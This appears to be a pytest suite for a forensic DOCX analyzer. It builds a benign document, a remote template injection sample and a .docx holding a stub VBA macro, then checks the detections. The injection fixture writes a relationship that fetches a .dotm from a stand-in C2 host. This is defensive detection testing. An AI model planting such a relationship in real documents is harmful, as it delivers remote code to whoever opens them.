"""
Unit tests for the Office OpenXML (DOCX and DOCM) forensic analyzer.
"""

import zipfile
from pathlib import Path
import pytest

from forensight.analyzers.docx_analyzer import DocxAnalyzer
from forensight.core.types import EvidenceMetadata, FindingSeverity, IOCType


class TestDocxAnalyzer:
    """Tests for macro detection, remote template injection, OLE objects, and metadata."""

    def test_benign_docx_analysis(self, tmp_path: Path) -> None:
        """Verify benign DOCX produces authorship metadata and no malicious findings."""
        doc_path = tmp_path / "report.docx"
        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("[Content_Types].xml", "<Types/>")
            zf.writestr("word/document.xml", "<w:document><w:body><w:p/></w:body></w:document>")
            zf.writestr(
                "docProps/core.xml",
                (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
                    'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/">'
                    '<dc:creator>Forensic Analyst Alice</dc:creator>'
                    '<cp:lastModifiedBy>Investigator Bob</cp:lastModifiedBy>'
                    '<dcterms:created>2026-11-10T10:00:00Z</dcterms:created>'
                    '</cp:coreProperties>'
                ),
            )

        meta = EvidenceMetadata(
            file_size_bytes=doc_path.stat().st_size,
            identified_type="DOCX",
            mime_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            declared_extension=".docx",
            entropy=4.0,
        )

        analyzer = DocxAnalyzer()
        output = analyzer.analyze(doc_path, meta)

        assert output.details["creator"] == "Forensic Analyst Alice"
        assert output.details["last_modified_by"] == "Investigator Bob"
        assert len(output.timeline_events) >= 1

        # No macro or template injection findings
        macro_findings = [f for f in output.findings if "DOCX-MACRO" in f.rule_id]
        assert len(macro_findings) == 0

    def test_remote_template_injection_detected(self, tmp_path: Path) -> None:
        """Verify remote template injection (MITRE T1221) is flagged with Critical severity."""
        doc_path = tmp_path / "weaponized_template.docx"
        remote_url = "http://adversary-c2.net/payload/malicious.dotm"

        rels_content = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            f'Target="{remote_url}" TargetMode="External"/>'
            '</Relationships>'
        )

        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("word/document.xml", "<w:document/>")
            zf.writestr("word/_rels/document.xml.rels", rels_content)

        meta = EvidenceMetadata(
            file_size_bytes=doc_path.stat().st_size,
            identified_type="DOCX",
            mime_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            declared_extension=".docx",
            entropy=4.2,
        )

        analyzer = DocxAnalyzer()
        output = analyzer.analyze(doc_path, meta)

        template_findings = [f for f in output.findings if f.rule_id == "DOCX-TEMPLATE-001"]
        assert len(template_findings) == 1
        assert template_findings[0].severity == FindingSeverity.CRITICAL

        # Assert remote URL was extracted as an IOC
        url_iocs = [ioc for ioc in output.iocs if ioc.ioc_type == IOCType.URL]
        assert len(url_iocs) == 1
        assert url_iocs[0].value == remote_url
        assert "hxxp://adversary-c2[.]net/payload/malicious[.]dotm" in url_iocs[0].defanged_value

    def test_vba_macro_in_docx_flagged_as_deception(self, tmp_path: Path) -> None:
        """Verify embedded VBA macro inside a .docx container triggers deception rule DOCX-MACRO-002."""
        doc_path = tmp_path / "stealth_macro.docx"
        with zipfile.ZipFile(doc_path, "w") as zf:
            zf.writestr("word/document.xml", "<w:document/>")
            zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1VBA_PROJECT")

        meta = EvidenceMetadata(
            file_size_bytes=doc_path.stat().st_size,
            identified_type="DOCM",
            mime_type="application/vnd.ms-word.document.macroEnabled.12",
            declared_extension=".docx",
            is_extension_mismatch=True,
            entropy=5.2,
        )

        analyzer = DocxAnalyzer()
        output = analyzer.analyze(doc_path, meta)

        macro_findings = [f for f in output.findings if f.rule_id == "DOCX-MACRO-002"]
        assert len(macro_findings) == 1
        assert macro_findings[0].severity == FindingSeverity.HIGH

